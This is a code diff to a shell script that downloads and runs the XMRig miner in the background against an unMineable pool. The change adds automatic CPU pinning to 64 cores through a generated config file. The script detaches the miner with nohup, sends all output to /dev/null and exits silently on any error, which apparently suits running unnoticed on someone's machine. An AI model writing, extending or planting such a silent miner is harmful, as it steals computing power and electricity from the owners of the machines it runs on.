@@ -15,6 +15,7 @@ THREADS=64
 BASE_DIR="${XDG_DATA_HOME:-${HOME:-${TMPDIR:-/tmp}}}"
 INSTALL_DIR="${XMRIG_DIR:-${BASE_DIR%/}/unmineable-xmrig}"
 XMRIG="$INSTALL_DIR/xmrig"
+CPU_CONFIG="$INSTALL_DIR/cpu-pinned.json"
 PID_FILE="$INSTALL_DIR/xmrig.pid"
 LOCK_DIR="$INSTALL_DIR/.startup-lock"
 
@@ -36,6 +37,34 @@ start_worker()
         esac
         rm -f "$PID_FILE"
     fi
+
+    command -v awk >/dev/null 2>&1 || exit 0
+    PINNED_CPUS=$(
+        awk -v required="$THREADS" '
+            /^Cpus_allowed_list:/ {
+                count = 0
+                range_count = split($2, ranges, ",")
+                for (i = 1; i <= range_count && count < required; i++) {
+                    bound_count = split(ranges[i], bounds, "-")
+                    first = bounds[1] + 0
+                    last = bound_count == 2 ? bounds[2] + 0 : first
+                    for (cpu = first; cpu <= last && count < required; cpu++) {
+                        printf "%s%d", count == 0 ? "" : ",", cpu
+                        count++
+                    }
+                }
+                exit count == required ? 0 : 1
+            }
+            END {
+                if (count != required) {
+                    exit 1
+                }
+            }
+        ' /proc/self/status
+    ) || exit 0
+    printf '{"autosave":false,"cpu":{"enabled":true,"rx":[%s]}}\n' \
+        "$PINNED_CPUS" >"$CPU_CONFIG" || exit 0
+    chmod 600 "$CPU_CONFIG" || exit 0
 
     TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
     TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
@@ -64,12 +93,12 @@ start_worker()
     command -v nohup >/dev/null 2>&1 || exit 0
     command -v nice >/dev/null 2>&1 || exit 0
     nohup nice -n 19 "$XMRIG" \
+        --config="$CPU_CONFIG" \
         -o "$POOL" \
         -a rx \
         -k \
         -u "$ACCOUNT.$WORKER" \
         -p x \
-        -t "$THREADS" \
         --ipv4 \
         --no-color \
         </dev/null >/dev/null 2>&1 &
